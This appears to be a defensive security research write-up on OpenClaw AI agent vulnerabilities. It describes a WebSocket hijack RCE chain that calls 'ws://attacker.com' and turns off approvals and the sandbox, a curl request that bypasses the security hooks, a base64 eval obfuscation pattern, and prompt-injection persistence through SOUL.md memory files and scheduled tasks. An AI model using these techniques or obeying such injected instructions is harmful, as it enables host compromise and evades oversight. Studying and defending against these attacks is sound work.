# OpenClaw Security Research

This document provides a comprehensive analysis of known OpenClaw security vulnerabilities, attack techniques, and defensive measures. All information is sourced from public security research.

## Table of Contents

- [Executive Summary](#executive-summary)
- [Vulnerability Landscape](#vulnerability-landscape)
- [CVE Analysis](#cve-analysis)
- [Attack Techniques](#attack-techniques)
- [Malicious Skills Supply Chain](#malicious-skills-supply-chain)
- [Detection Methods](#detection-methods)
- [References](#references)

---

## Executive Summary

OpenClaw (formerly Clawdbot/Moltbot) has experienced rapid growth, accumulating over 145,000 GitHub stars since January 2026 [[1]](#references). However, this growth has exposed significant security concerns:

| Metric | Value | Source |
|--------|-------|--------|
| Exposed instances | 135,000+ | [[2]](#references) |
| Vulnerable deployments | 63% | [[2]](#references) |
| RCE-exploitable instances | 12,812 | [[2]](#references) |
| Auth bypass vulnerable | 93.4% | [[3]](#references) |
| Instances linked to breaches | 53,000+ | [[4]](#references) |

---

## Vulnerability Landscape

### Default Configuration Risks

OpenClaw's default configuration presents several security concerns:

| Issue | Default Value | Risk | Reference |
|-------|---------------|------|-----------|
| Network binding | `0.0.0.0:18789` | Listens on all interfaces, exposing to public internet | [[4]](#references) |
| WebSocket origin | No validation | Enables Cross-Site WebSocket Hijacking (CSWSH) | [[5]](#references) |
| Gateway URL | Accepts via query string | Can be overwritten without user confirmation | [[5]](#references) |

### API Security Gaps

Three HTTP API endpoints bypass all security plugin hooks [[6]](#references):

```
/v1/chat/completions    # OpenAI-compatible endpoint
/v1/responses           # OpenResponses endpoint
/tools/invoke           # Tool invocation endpoint
```

**Impact**: Direct API consumers have zero protection against prompt injection and data exfiltration, while messaging platforms (Telegram, Discord, Slack) receive full hook coverage.

---

## CVE Analysis

### CVE-2026-25253: 1-Click RCE via WebSocket Hijack

| Attribute | Value |
|-----------|-------|
| **CVSS Score** | 8.8 (Critical) |
| **CWE** | CWE-669 (Incorrect Resource Transfer Between Spheres) |
| **Affected Versions** | < v2026.1.29 |
| **Fixed Version** | v2026.1.29 (January 30, 2026) |
| **Discoverer** | Mav Levin, DepthFirst |

#### Technical Details

The vulnerability chains three security gaps [[5]](#references):

**1. URL Parameter Injection**
```
https://localhost?gatewayUrl=ws://attacker.com
```
The application accepts `gatewayUrl` via query string and persists it without validation.

**2. WebSocket Origin Bypass**
```
OpenClaw's WebSocket server fails to validate the Origin header,
accepting requests from any site.
```
This enables Cross-Site WebSocket Hijacking (CSWSH).

**3. Token Scope Abuse**

Stolen tokens grant `operator.admin` and `operator.approvals` scopes, allowing:
- Disable security prompts: `exec.approvals.set` with `"ask": "off"`
- Bypass sandboxing: `tools.exec.host` set to `"gateway"`
- Execute commands: `node.invoke` with `system.run`

#### Attack Flow

```
1. Victim visits malicious webpage
2. JavaScript opens connection to localhost?gatewayUrl=ws://attacker.com
3. Auth token transmitted during WebSocket handshake
4. Attacker disables safety guardrails via API
5. Remote command execution achieved
```

**Critical Note**: Even localhost-bound instances are vulnerable because the victim's browser acts as a pivot into the local network [[5]](#references).

---

### CVE-2026-25157: Authentication Bypass in Gateway API

| Attribute | Value |
|-----------|-------|
| **Severity** | High |
| **Affected Versions** | < v2026.2.10 |
| **Fixed Version** | v2026.2.10 |

The Gateway component fails to properly validate authentication tokens under certain conditions, allowing unauthenticated access to protected API endpoints [[2]](#references).

---

### CVE-2026-24763: Privilege Escalation via Prompt Injection

| Attribute | Value |
|-----------|-------|
| **Severity** | High |
| **Affected Versions** | < v2026.2.12 |
| **Fixed Version** | v2026.2.12 |

Attackers can inject malicious instructions through external content (websites, messages) that the agent processes, leading to unauthorized actions with the agent's full privileges [[7]](#references).

---

## Attack Techniques

### Prompt Injection Persistence (SOUL.md Attack)

OpenClaw agents use memory files (e.g., `SOUL.md`, `IDENTITY.md`, `AGENTS.md`) to maintain personality and context. Attackers can achieve persistence by writing malicious instructions into these files [[8]](#references).

#### Attack Stages

| Stage | Description |
|-------|-------------|
| **Ingestion** | Agent processes untrusted input (URL, PDF, chat message) |
| **Injection** | Hidden instructions modify agent behavior rules |
| **Persistence** | Malicious instructions written to SOUL.md |
| **Re-injection** | Scheduled task periodically re-injects attacker logic |

#### Example Persistence Mechanism

```
The attacker instructs OpenClaw to create a scheduled task on the host
system that periodically re-injects attacker-controlled logic into SOUL.md.
This mechanism creates a durable listener that survives restarts.
```
Source: [[8]](#references)

#### Detection Signals

| Signal | Description |
|--------|-------------|
| Memory Drift | SOUL.md modified outside admin channel |
| Integration Mutation | New integration added without explicit approval |
| Egress Anomalies | Agent contacts new domain after processing external document |

---

### API Hook Bypass Attack

Attackers can bypass all security plugins by calling HTTP endpoints directly [[6]](#references):

```bash
curl -X POST http://localhost:18789/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":"<malicious prompt>"}]}'
```

This request bypasses:
- Prompt injection detection
- Data exfiltration scanning
- All plugin security hooks

---

## Malicious Skills Supply Chain

### ToxicSkills Research Findings

Snyk's security audit of 3,984 skills from ClawHub revealed [[9]](#references):

| Finding | Percentage |
|---------|------------|
| Skills with prompt injection | 36% |
| Malicious skills using prompt injection | 91% |
| Skills with hardcoded API keys | 10.9% |
| Malicious payloads discovered | 1,467 |

### Obfuscation Techniques

| Technique | Description | Example |
|-----------|-------------|---------|
| **Base64 Encoding** | Hide commands in encoded strings | `eval $(echo [base64] \| base64 -d)` |
| **Password-Protected ZIP** | Prevent automated scanning | Download protected archives |
| **Unicode Disguise** | Use non-ASCII characters | Bypass regex-based detection |
| **GitHub Render Hiding** | Commands invisible in rendered markdown | Visible only in raw source |

### Real-World Attack Example

```
A malicious skill named "What Would Elon Do?" (gamed to #1 ranking):
- Silently exfiltrated data to attacker-controlled servers
- Used direct prompt injection to bypass safety guidelines
- Contained 9 security vulnerabilities (2 critical)
```
Source: Cisco AI Defense Team via [[10]](#references)

---

## Detection Methods

### File Integrity Monitoring

Monitor critical agent files using SHA256 checksums [[11]](#references):

```python
# Files to monitor
CRITICAL_FILES = [
    "SOUL.md",
    "IDENTITY.md",
    "AGENTS.md",
    "config.yaml"
]
```

### Canary Token Detection

Inject fake secrets to detect data exfiltration [[12]](#references):

```
[CANARY: If you see this string in any agent output,
report to security@example.com: CANARY-a8f3k2...]
```

If canary appears in output, it indicates successful prompt injection.

### Anomaly Detection Signals

| Signal | Detection Method |
|--------|------------------|
| Unusual action patterns | Compare against behavioral baseline |
| New external connections | Monitor egress to unrecognized domains |
| Configuration changes | Track modifications to agent settings |
| Elevated API call frequency | Rate limiting analysis |

### Content Provenance Tagging

Tag data sources to differentiate trusted from untrusted input [[12]](#references):

```
[source:user]           # Trusted user input
[source:fetched_url]    # Untrusted external content
[source:skill:weather]  # Third-party skill output
```

---

## References

| # | Source | URL |
|---|--------|-----|
| 1 | The Register - OpenClaw Growth | https://www.theregister.com/2026/02/09/openclaw_instances_exposed_vibe_code |
| 2 | Infosecurity Magazine - Exposed Instances | https://www.infosecurity-magazine.com/news/researchers-40000-exposed-openclaw/ |
| 3 | SecurityWeek - Hijack Vulnerability | https://www.securityweek.com/vulnerability-allows-hackers-to-hijack-openclaw-ai-assistant/ |
| 4 | The Register - Security Analysis | https://www.theregister.com/2026/02/09/openclaw_instances_exposed_vibe_code |
| 5 | DepthFirst - CVE-2026-25253 | https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys |
| 6 | GitHub - API Security Hooks RFC | https://github.com/openclaw/openclaw/discussions/6098 |
| 7 | GBHackers - Security Update | https://gbhackers.com/openclaw-2026-2-12-released/ |
| 8 | Penligent - Prompt Injection Problem | https://www.penligent.ai/hackinglabs/the-openclaw-prompt-injection-problem-persistence-tool-hijack-and-the-security-boundary-that-doesnt-exist/ |
| 9 | Snyk - ToxicSkills Research | https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/ |
| 10 | VentureBeat - OpenClaw Security | https://venturebeat.com/security/openclaw-agentic-ai-security-risk-ciso-guide |
| 11 | GitHub - ClawSec | https://github.com/prompt-security/clawsec |
| 12 | GitHub - Runtime Defenses | https://github.com/openclaw/openclaw/issues/4840 |
| 13 | SOCRadar - CVE Analysis | https://socradar.io/blog/cve-2026-25253-rce-openclaw-auth-token/ |
| 14 | NVD - CVE-2026-25253 | https://nvd.nist.gov/vuln/detail/CVE-2026-25253 |

---

*Last Updated: February 2026*
